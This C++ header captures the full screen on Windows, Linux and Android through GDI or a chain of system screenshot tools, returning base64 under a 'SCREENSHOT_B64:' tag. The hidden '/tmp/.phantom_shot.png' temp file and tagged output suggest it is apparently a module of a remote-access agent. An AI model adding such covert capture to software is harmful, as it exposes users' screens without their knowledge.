#pragma once

#include <vector>
#include <string>
#include "crypto.h"

#ifdef _WIN32
#include <windows.h>

namespace screenshot {

inline std::string capture() {
    HDC hScreenDC = GetDC(nullptr);
    if (!hScreenDC) return "SCREENSHOT_ERROR: GetDC failed";

    int screen_w = GetDeviceCaps(hScreenDC, HORZRES);
    int screen_h = GetDeviceCaps(hScreenDC, VERTRES);

    int width = screen_w;
    int height = screen_h;

    HDC hMemDC = CreateCompatibleDC(hScreenDC);
    if (!hMemDC) {
        ReleaseDC(nullptr, hScreenDC);
        return "SCREENSHOT_ERROR: CreateCompatibleDC failed";
    }

    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    if (!hBitmap) {
        DeleteDC(hMemDC);
        ReleaseDC(nullptr, hScreenDC);
        return "SCREENSHOT_ERROR: CreateCompatibleBitmap failed";
    }

    HGDIOBJ hOld = SelectObject(hMemDC, hBitmap);
    BitBlt(hMemDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
    SelectObject(hMemDC, hOld);

    DeleteDC(hMemDC);
    ReleaseDC(nullptr, hScreenDC);

    BITMAPINFOHEADER bi = {0};
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = width;
    bi.biHeight = height;
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = width * height * 4;

    std::vector<BYTE> pixels(bi.biSizeImage);
    HDC hReadDC = CreateCompatibleDC(nullptr);
    if (hReadDC) {
        SelectObject(hReadDC, hBitmap);
        GetDIBits(hReadDC, hBitmap, 0, height, pixels.data(), (BITMAPINFO*)&bi, DIB_RGB_COLORS);
        DeleteDC(hReadDC);
    }
    DeleteObject(hBitmap);

    BITMAPFILEHEADER bf;
    bf.bfType = 0x4D42;
    bf.bfSize = sizeof(bf) + sizeof(bi) + bi.biSizeImage;
    bf.bfReserved1 = 0;
    bf.bfReserved2 = 0;
    bf.bfOffBits = sizeof(bf) + sizeof(bi);

    std::vector<BYTE> bmp;
    bmp.reserve(bf.bfSize);
    auto ptr = reinterpret_cast<const BYTE*>(&bf);
    bmp.insert(bmp.end(), ptr, ptr + sizeof(bf));
    ptr = reinterpret_cast<const BYTE*>(&bi);
    bmp.insert(bmp.end(), ptr, ptr + sizeof(bi));
    bmp.insert(bmp.end(), pixels.begin(), pixels.end());

    return "SCREENSHOT_B64:" + crypto::base64_encode(bmp);
}

} // namespace screenshot

#elif defined(__linux__)
#include <cstdio>
#include <cstdlib>
#include <cstring>

namespace screenshot {

// Capture a command's stdout as PNG bytes. True only on a CLEAN exit with
// data: a tool that failed (no Wayland socket, no DISPLAY) must not be
// reported as a screenshot.
inline bool capture_stdout_png(const std::string& cmd,
                               std::vector<unsigned char>& out) {
    out.clear();
    FILE* f = popen(cmd.c_str(), "re");
    if (!f) return false;
    char buf[4096];
    int n;
    while ((n = fread(buf, 1, sizeof(buf), f)) > 0) {
        out.insert(out.end(), buf, buf + n);
    }
    return pclose(f) == 0 && !out.empty();
}

// Run a tool that writes PNG to a file, then read (and remove) it.
inline bool capture_file_png(const std::string& cmd, const char* path,
                             std::vector<unsigned char>& out) {
    out.clear();
    std::remove(path);
    if (system(cmd.c_str()) != 0) { std::remove(path); return false; }
    FILE* f = fopen(path, "rb");
    if (f) {
        fseek(f, 0, SEEK_END);
        long sz = ftell(f);
        fseek(f, 0, SEEK_SET);
        if (sz > 0) {
            out.resize(static_cast<size_t>(sz));
            size_t got = fread(out.data(), 1, static_cast<size_t>(sz), f);
            out.resize(got);
        }
        fclose(f);
    }
    std::remove(path);
    return !out.empty();
}

inline std::string capture() {
    // Ordered by how WIDELY the tool is present, not by protocol: Wayland is
    // now the default session on Fedora/Ubuntu, where the old X11 grabbers
    // (`import -window root`, `xwd`) return an EMPTY frame — so the Wayland
    // tools are tried first, then X11, then Android's `screencap`.
    std::vector<unsigned char> png;
    const char* tmp = "/tmp/.phantom_shot.png";

    // Wayland: grim pipes the PNG straight to stdout (needs a Wayland session)
    if (capture_stdout_png("grim - 2>/dev/null", png)) {
        return "SCREENSHOT_B64:" + crypto::base64_encode(png);
    }
    // GNOME (Wayland or X11)
    if (capture_file_png(std::string("gnome-screenshot -f ") + tmp +
                         " >/dev/null 2>&1", tmp, png)) {
        return "SCREENSHOT_B64:" + crypto::base64_encode(png);
    }
    // KDE Spectacle
    if (capture_file_png(std::string("spectacle -b -n -o ") + tmp +
                         " >/dev/null 2>&1", tmp, png)) {
        return "SCREENSHOT_B64:" + crypto::base64_encode(png);
    }
    // X11: scrot
    if (capture_file_png(std::string("scrot -z ") + tmp +
                         " >/dev/null 2>&1", tmp, png)) {
        return "SCREENSHOT_B64:" + crypto::base64_encode(png);
    }

    // Method 1: import (ImageMagick)
    std::string cmd = "import -window root -quality 85 PNG:- 2>/dev/null";
    FILE* f = popen(cmd.c_str(), "re");
    if (f) {
        std::vector<unsigned char> png_data;
        char buf[4096];
        int n;
        while ((n = fread(buf, 1, sizeof(buf), f)) > 0) {
            png_data.insert(png_data.end(), buf, buf + n);
        }
        int ret = pclose(f);
        if (ret == 0 && !png_data.empty()) {
            return "SCREENSHOT_B64:" + crypto::base64_encode(png_data);
        }
    }

    // Method 2: xwd + convert
    cmd = "xwd -root -silent 2>/dev/null | convert xwd:- PNG:- 2>/dev/null";
    f = popen(cmd.c_str(), "re");
    if (f) {
        std::vector<unsigned char> png_data;
        char buf[4096];
        int n;
        while ((n = fread(buf, 1, sizeof(buf), f)) > 0) {
            png_data.insert(png_data.end(), buf, buf + n);
        }
        int ret = pclose(f);
        if (ret == 0 && !png_data.empty()) {
            return "SCREENSHOT_B64:" + crypto::base64_encode(png_data);
        }
    }

    // Method 3: Android screencap
    cmd = "screencap -p 2>/dev/null";
    f = popen(cmd.c_str(), "re");
    if (f) {
        std::vector<unsigned char> png_data;
        char buf[4096];
        int n;
        while ((n = fread(buf, 1, sizeof(buf), f)) > 0) {
            png_data.insert(png_data.end(), buf, buf + n);
        }
        int ret = pclose(f);
        if (ret == 0 && !png_data.empty()) {
            return "SCREENSHOT_B64:" + crypto::base64_encode(png_data);
        }
    }

    return "SCREENSHOT_ERROR: No screenshot tool available (import, xwd, screencap)";
}

} // namespace screenshot

#else
// Android or other POSIX - use screencap or import
namespace screenshot {

inline std::string capture() {
    // Try Android's screencap
    FILE* f = popen("screencap -p 2>/dev/null", "re");
    if (f) {
        std::vector<unsigned char> png_data;
        char buf[4096];
        int n;
        while ((n = fread(buf, 1, sizeof(buf), f)) > 0) {
            png_data.insert(png_data.end(), buf, buf + n);
        }
        int ret = pclose(f);
        if (ret == 0 && !png_data.empty()) {
            return "SCREENSHOT_B64:" + crypto::base64_encode(png_data);
        }
    }
    return "SCREENSHOT_ERROR: No screenshot tool available.";
}

} // namespace screenshot
#endif
